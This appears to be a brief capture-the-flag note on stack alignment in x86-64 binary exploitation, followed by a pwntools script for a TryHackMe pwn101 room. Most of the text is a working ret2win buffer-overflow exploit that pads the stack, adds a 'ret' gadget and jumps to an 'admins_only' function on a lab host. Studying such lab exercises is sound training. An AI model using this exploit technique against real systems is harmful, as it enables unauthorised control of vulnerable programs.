If targets run Ubuntu, keep in mind that there's stack allignment.
If there's misallignment, use a ROP return gadget

Example:

https://tryhackme.com/room/pwn101 (pwn103)

```
from pwn import *

current_thmip = '10.10.134.184'
p = remote(current_thmip, 9003)
# p = process('./pwn103.pwn103')
elf = ELF('./pwn103.pwn103')
rop = ROP(elf)

payload = b'A'*40
payload += p64(rop.find_gadget(['ret'])[0]) # address of a 'ret' instruction - needed for stack alignment.
payload += p64(elf.symbols['admins_only']) # admins_only win function

p.clean()
p.sendline('3') # navigating menu

p.clean()
p.sendline(payload)

print(p.clean())
p.interactive()
```